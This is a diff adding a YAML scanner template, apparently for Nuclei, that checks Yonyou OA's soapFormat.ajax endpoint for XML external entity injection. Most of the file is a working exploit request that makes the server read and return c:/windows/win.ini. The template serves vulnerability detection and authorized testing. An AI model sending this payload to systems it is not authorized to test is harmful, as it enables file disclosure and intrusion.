@@ -1,0 +1,37 @@
+id: yongyou-soapFormat-xml
+
+info:
+  name: 用友OA接口soapFormat存在XML外部实体注入漏洞
+  author: g3m
+  severity: high
+
+http:
+  - raw:
+    - |
+      @timeout 30s
+      POST /uapws/soapFormat.ajax HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36
+      Content-Type: application/x-www-form-urlencoded
+      Content-Length: 272
+
+      msg=<!DOCTYPE foo[<!ENTITY xxe1two SYSTEM "file:///c:/windows/win.ini"> ]>
+      <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+      <soap:Body>
+      <soap:Fault>
+      <faultcode>soap:Server%26xxe1two%3b</faultcode>
+      </soap:Fault>
+      </soap:Body>
+      </soap:Envelope>%0a
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "[fonts]"
+          - "[extensions]"
+        condition: and
+
+      - type: status
+        status:
+          - 200
